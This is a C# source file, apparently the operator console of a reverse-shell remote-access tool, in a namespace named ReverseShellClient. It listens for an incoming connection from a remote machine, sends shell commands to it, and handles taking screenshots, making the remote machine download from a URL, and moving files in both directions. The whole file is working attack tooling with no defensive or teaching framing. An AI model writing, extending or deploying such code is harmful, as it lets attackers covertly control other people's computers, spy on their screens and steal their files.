using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace ReverseShellClient
{
    public class ClientManager
    {
        Socket socketForServer;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        BinaryWriter binaryWriter;
        BinaryReader binaryReader;
        StringBuilder strInput;
        TcpListener tcpListener;

        ClientTools tools;
        bool connected;
        bool processingCommand;
        string toolsFilePath;


        public ClientManager()
        {
            connected = false;
            processingCommand = false;
            toolsFilePath = "";
            Console.ForegroundColor = ConsoleColor.Green;
        }


        public void Start()
        {
            var listen = true;

            while (listen)
            {
                Console.Write(@"Please type a port number to listen to : ");
                var port = 0;
                while (port == 0)
                {
                    try
                    {
                        port = int.Parse(Console.ReadLine());
                    }
                    catch (Exception)
                    {
                        Console.WriteLine(@"... please ...");
                    }
                }

                StartListen(port);

                listen = AskListenAgain();
            }
        }


        void StartListen(int port)
        {
            tcpListener = new TcpListener(IPAddress.Any, port);
            tcpListener.Start();

            Console.Clear();
            ConsoleColorTools.WriteCommandMessage("Listening on port " + port + " ...");
            // Wait for an incoming connection
            socketForServer = tcpListener.AcceptSocket();
            connected = true;

            var runClient = new Task(RunClient);
            runClient.Start();

            ProcessInput();
        }


        void RunClient()
        {
            networkStream = new NetworkStream(socketForServer);
            streamReader = new StreamReader(networkStream);
            streamWriter = new StreamWriter(networkStream);
            binaryWriter = new BinaryWriter(networkStream);
            binaryReader = new BinaryReader(networkStream);
            strInput = new StringBuilder();

            tools = new ClientTools(binaryWriter, binaryReader, streamWriter, streamReader);

            ConsoleColorTools.WriteCommandMessage("Connected to " + (IPEndPoint)socketForServer.RemoteEndPoint + "\n");

            tools.SayHello();


            // Listening loop
            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());

                    switch (strInput.ToString())
                    {
                        case "{Screenshot:init}":
                            tools.ReceiveScreenShot();
                            break;
                        case "{UrlDownload:init}":
                            tools.WaitForServerToFinishFileDownload();
                            break;
                        case "{ReceiveFileFromClient:init}":
                            tools.UploadFile(toolsFilePath);
                            break;
                        case "{UploadFileToClient:init}":
                            tools.DownloadFile(toolsFilePath);
                            break;
                        default:
                            // Normal output (text)
                            // Check if the line isn't the one representing the path in the cmd
                            if (!(strInput[strInput.Length - 1] == '>' && strInput.ToString().Contains(@":\")))
                            {
                                // Add line return
                                strInput.Append("\r\n");
                            }

                            // Display received data
                            Console.Write(strInput.ToString());
                            break;
                    }

                    if (processingCommand)
                    {
                        processingCommand = false;
                    }


                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception)
                {
                    Cleanup();
                    break;
                }
            }
        }


        void ProcessInput()
        {
            while (true)
            {
                var command = Console.ReadLine();

                // If the connection was closed, break from the loop
                if (!connected)
                {
                    break;
                }

                // If not allowed to send commands, continue to next turn
                if (processingCommand)
                {
                    continue;
                }


                if (command == "clear" || command == "cls")
                {
                    // Clear console
                    Console.Clear();
                }
                else if (command == "")
                {
                    tools.SayHello();
                }
                else
                {
                    var result = PreProcessCommand(ref command);
                    if (result == "ok")
                    {
                        // Send command
                        streamWriter.WriteLine(command);
                        streamWriter.Flush();
                    }
                    else if (result == "syntaxError")
                    {
                        ConsoleColorTools.WriteError("Syntax error");
                    }
                    else if (result == "fileError")
                    {
                        ConsoleColorTools.WriteCommandError("The specified folder / file doesn't exist");
                    }
                }
            }
        }


        string PreProcessCommand(ref string command)
        {
            var result = "ok";
            var commandPart = command.Split(' ')[0];

            if (command == "ls")
            {
                command = "dir";
            }
            else if (commandPart == "#screenshot" || commandPart == "#downloadurl" || commandPart == "#upload" || commandPart == "#download" || commandPart == "lcd" || commandPart == "lcwd" || commandPart == "lls")
            {
                if (commandPart != "#screenshot")
                {
                    if (command.Split(' ').Length == 2)
                    {
                        var argumentPart = command.Split(' ')[1];
                        if (commandPart == "#upload" || commandPart == "#download")
                        {
                            // Local file exists for upload ?
                            if (commandPart == "#upload" && !File.Exists(argumentPart))
                            {
                                result = "fileError";
                            }
                            else
                            {
                                toolsFilePath = argumentPart;
                            }
                        }
                        else if (commandPart == "lcd")
                        {
                            tools.lcd(argumentPart);
                            result = "localCommand";
                        }
                    }
                    else if (commandPart == "lcwd")
                    {
                        tools.lcwd();
                        result = "localCommand";
                    }
                    else if (commandPart == "lls")
                    {
                        tools.lls();
                        result = "localCommand";
                    }
                    else
                    {
                        result = "syntaxError";
                    }
                }

                if (result == "ok")
                {
                    // Will have to wait for the process to finish in order to issue commands again
                    processingCommand = true;
                }
                else
                {
                    // Just display the cmd path
                    tools.SayHello();
                }
            }

            return result;
        }


        bool AskListenAgain()
        {
            Console.Write("Listen again ? (y/N) ");
            var input = Console.ReadLine();
            Console.Clear();

            return input == "y" || input == "Y";
        }


        void Cleanup()
        {
            ConsoleColorTools.WriteWarning(processingCommand ? "\nDisconnected, operation stopped [ENTER]" : "\nDisconnected [ENTER]");

            connected = false;

            try
            {
                streamReader.Close();
                streamWriter.Close();
                binaryReader.Close();
                binaryWriter.Close();
                networkStream.Close();
                socketForServer.Close();
                tcpListener.Stop();
            }
            catch (Exception)
            {
                // ignored
            }
        }
    }
}
